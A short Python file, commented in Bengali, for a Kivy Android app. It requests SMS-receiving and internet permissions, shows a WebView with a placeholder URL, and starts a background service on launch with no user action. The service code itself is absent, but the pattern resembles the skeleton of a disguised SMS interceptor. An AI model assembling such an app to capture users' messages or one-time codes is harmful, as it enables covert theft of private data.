from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy_garden.webview import WebView
from android.permissions import request_permissions, Permission
from jnius import autoclass


class MyApp(App):
    def build(self):
        # SMS এবং INTERNET পেরমিশন অনুরোধ
        request_permissions([Permission.RECEIVE_SMS, Permission.INTERNET, Permission.FOREGROUND_SERVICE])

        # WebView তৈরি
        layout = BoxLayout(orientation='vertical')
        self.webview = WebView()
        self.webview.url = "https://www.google.com"  # আপনার URL দিন
        layout.add_widget(self.webview)

        # SMS সার্ভিস স্বয়ংক্রিয়ভাবে চালু করা
        self.start_sms_service()

        return layout

    def start_sms_service(self):
        # ব্যাকগ্রাউন্ড সার্ভিস চালু করুন
        service = autoclass('org.kivy.android.PythonService')
        service.start('background_service.py')  # ব্যাকগ্রাউন্ড সার্ভিস চালু

        print("Background service started.")

if __name__ == "__main__":
    MyApp().run()